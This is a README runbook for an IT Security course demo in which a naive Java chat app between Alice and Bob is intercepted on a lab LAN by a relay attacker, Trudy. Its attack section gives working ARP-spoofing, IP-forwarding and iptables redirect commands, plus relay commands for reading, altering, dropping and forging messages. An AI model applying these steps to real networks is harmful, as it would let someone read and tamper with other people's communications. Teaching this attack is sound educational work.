# MeTM — Man-in-the-Middle chat demo

A deliberately naive Java chat app (Alice, Bob) and an active relay attacker
(Trudy), built for an IT Security course demo. The design rationale — why the
identity handshake, the naive IP check, and the reconnect wrapper exist, and
exactly what each one does and doesn't prove — is in `IMPLEMENTATION.md`. This
file is just the "how do I actually run it" runbook.

Package: `com.herrcult69.metm`. Session terminator: the literal line `EOF END`.

| Who   | IP              | Machine                                              |
|-------|-----------------|-------------------------------------------------------|
| Alice | 192.168.0.123   | Surface 2 or MacBook, native OS, Wi-Fi                 |
| Bob   | 192.168.0.152   | Dev laptop, Windows, native OS, Wi-Fi                  |
| Trudy | 192.168.0.24    | Kali VM on the dev laptop (VMware), bridged via USB-Ethernet adapter into a TotoLink LAN port |

(Replace with your actual `ipconfig` / `ip -br a` values if they differ.)

---

## Part 1 — Environment setup

### 1.1 Router

- TotoLink admin page: **Operation Mode = Router** (not AP/Bridge/Repeater).
- **AP Isolation (Client Isolation) = off.**
- Reserve all three IPs above under DHCP Address Reservation, so nothing shifts
  mid-demo.

### 1.2 Alice and Bob (native Windows/macOS, over Wi-Fi)

- Both join the TotoLink SSID.
- Windows network profile: **Private**, not Public (Public blocks inbound
  connections and ICMP by default).
- If pinging between them fails with "Destination host unreachable" or times
  out, check in this order:
  1. `arp -a` on the machine that can't reach the other — is the peer's MAC
     listed at all?
  2. Windows Firewall rule on the *receiving* side:
     ```
     netsh advfirewall firewall show rule name="File and Printer Sharing (Echo Request - ICMPv4-In)"
     ```
     If disabled:
     ```
     netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=yes
     ```
  3. Allow Bob's chat port through his firewall:
     ```
     netsh advfirewall firewall add rule name="MITM Bob 9000" dir=in action=allow protocol=TCP localport=9000
     ```

### 1.3 Trudy (Kali VM on the dev laptop, VMware)

- VM network adapter: **Bridged**, to the USB-to-Ethernet adapter specifically
  — not Wi-Fi, and not VMware's "Automatic" bridge target (which usually picks
  the Wi-Fi card instead). Set this in VMware's **Edit → Virtual Network
  Editor → VMnet0 → Bridged to:**, choosing the USB adapter by name.
- Plug the USB-Ethernet adapter into the dev laptop and its cable into a
  TotoLink LAN port.
- Inside the VM, confirm: `ip -br a` should show an interface (commonly named
  `eth0`, but check — some USB adapters show up as `enx<mac>`) with a
  `192.168.0.x` address from the TotoLink.
- Install the attack tools:
  ```
  sudo apt update && sudo apt install -y dsniff wireshark
  ```
- Fallback if the USB adapter won't bridge cleanly: boot Kali from a USB stick
  on bare metal instead of a VM.

### 1.4 Build the Java project

From `MeTM/`:
```
mvn -q compile
```
or without Maven:
```
javac -d target/classes src/main/java/com/herrcult69/metm/*.java
```

If `release version N not supported` shows up, check `pom.xml` — it should use
`maven.compiler.source` / `maven.compiler.target` (currently `11`), not
`maven.compiler.release`, since `--release` requires JDK-bundled historical API
data that not every machine's JDK ships for every version.

---

## Part 2 — How to attack

### 2.1 Baseline (prove it works before attacking it)

- Bob's laptop: `.\run-bob.ps1`
- Alice's machine: `.\run-alice.ps1`

Expect both sides to log `connected to <ip> (matches the expected address)`,
then type messages either direction — full duplex, no waiting for a reply.

### 2.2 Bring Trudy into the path (works even mid-conversation now)

On the Kali VM, in order, each in its own terminal:

**Terminal 1 — forwarding:**
```
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv4.conf.all.rp_filter=0
```

**Terminal 2 — ARP spoof (leave running):**
```
sudo arpspoof -i eth0 -t 192.168.0.123 192.168.0.152
```

**Terminal 3 — redirect Alice's chat traffic into Trudy's relay:**
```
sudo iptables -t nat -A PREROUTING -p tcp -d 192.168.0.152 --dport 9000 -j REDIRECT --to-port 6000
```

**Terminal 4 — start the relay:**
```
java -cp target/classes com.herrcult69.metm.Trudy 6000 192.168.0.152 9000
```

Alice and Bob's existing connection will drop the moment the spoof takes
effect — expected. Their wrapper scripts will print "connection dropped ...
reconnecting in 2s..." and come back on their own within a couple seconds.
Once reconnected, Trudy's console should show:
```
Alice connected from /192.168.0.123:...
connected onward to Bob at /192.168.0.152:...
```

Bob's console will also print a one-time warning that the real connecting IP
(192.168.0.24) doesn't match the expected Alice address — that's the naive IP
check correctly detecting the relay. It's one line; everything after it looks
like a normal chat.

### 2.3 Live attack commands (type into Trudy's terminal)

| Command | What it demonstrates |
|---|---|
| *(nothing — just watch)* | eavesdropping: every line Alice and Bob exchange is already visible in Trudy's log, in plain text |
| `/replace love=hate` | tampering — Bob receives a changed message Alice never sent |
| `/noreplace` | turn tampering off |
| `/drop meet` | sabotage — any line containing "meet" silently vanishes, neither side told |
| `/nodrop` | turn dropping off |
| `/toalice sorry, who is this?` | forgery as "Bob" — Alice sees it, the real Bob never did |
| `/tobob transfer 500 to Trudy` | forgery as "Alice" — Bob sees it, the real Alice never did |
| `/help` | list commands again |

Suggested demo order: let a few real messages pass through untouched first
(prove the relay genuinely works), then `/replace` one word live, then
`/toalice` an unprompted forged line to show outright fabrication.

### 2.4 Teardown — do this before anyone else uses the network

On the Kali VM:
```
sudo iptables -t nat -F
# Ctrl+C in the arpspoof terminal (it sends corrective ARPs on exit)
sudo sysctl -w net.ipv4.ip_forward=0
```

On Alice's and Bob's machines, Command Prompt as administrator:
```
arp -d *
```

Confirm with `arp -a` that Bob's and Alice's MAC addresses are back to their
real ones.
